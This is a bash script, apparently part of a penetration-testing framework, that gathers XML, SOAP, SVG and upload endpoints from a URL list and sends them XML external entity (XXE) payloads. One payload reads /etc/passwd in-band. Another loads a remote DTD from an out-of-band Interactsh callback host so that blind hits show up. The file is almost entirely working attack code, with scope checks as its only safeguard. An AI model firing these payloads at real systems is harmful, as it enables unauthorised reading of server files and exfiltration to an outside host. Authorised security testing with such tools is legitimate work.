#!/usr/bin/env bash
# vuln/xxe.sh — XXE probe across XML-accepting endpoints.

PHASE="xxe"
. "$(dirname "$0")/_lib.sh"
require_target
ensure_scope
OUTDIR=$(out_dir "$PHASE")

ENDPOINTS="${XML_ENDPOINTS:-}"
if [ -z "$ENDPOINTS" ]; then
    URLS_FILE=$(resolve_urls_input)
    [ -z "$URLS_FILE" ] && { log ERR "no URL corpus"; exit 5; }
    # Heuristic: endpoints that mention xml/soap/rss/svg/upload
    ENDPOINTS="$OUTDIR/xml-candidates.txt"
    grep -iE '(\.xml|\.svg|soap|rss|atom|/api/.*xml|upload)' "$URLS_FILE" \
        | sort -u > "$ENDPOINTS"
fi

if [ ! -s "$ENDPOINTS" ]; then
    log ERR "no XML candidates"
    exit 5
fi

# OOB XXE payload pointing at our Interactsh session
OOB_URL="${INTERACTSH_URL:-}"
if [ -z "$OOB_URL" ]; then
    sess="$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/13-oob-callback/session-url.txt"
    [ -s "$sess" ] && OOB_URL=$(cat "$sess")
fi

# In-band classic /etc/passwd probe (works on simple parsers)
INBAND='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'

# OOB blind probe (works when in-band is filtered)
if [ -n "$OOB_URL" ]; then
    OOB='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "http://'$OOB_URL'/xxe.dtd">%ext;]><r/>'
fi

log INFO "firing $(wc -l < "$ENDPOINTS") XXE probes"
: > "$OUTDIR/findings.txt"
while read -r u; do
    [ -z "$u" ] && continue
    # In-band classic
    resp=$(curl -sS --max-time 10 -X POST "$u" \
        -H 'Content-Type: application/xml' \
        -d "$INBAND" 2>/dev/null | head -c 5000)
    if echo "$resp" | grep -q "root:x:"; then
        log INFO "XXE CONFIRMED (in-band /etc/passwd): $u"
        echo "$u | INBAND" >> "$OUTDIR/findings.txt"
        continue
    fi
    # OOB blind
    if [ -n "${OOB:-}" ]; then
        curl -sS --max-time 10 -X POST "$u" \
            -H 'Content-Type: application/xml' \
            -d "$OOB" >/dev/null 2>&1 || true
        # Confirmation lives in the Interactsh callbacks log
    fi
done < "$ENDPOINTS"

log INFO "xxe done — $(wc -l < "$OUTDIR/findings.txt") in-band hits; OOB hits will appear in your Interactsh log"
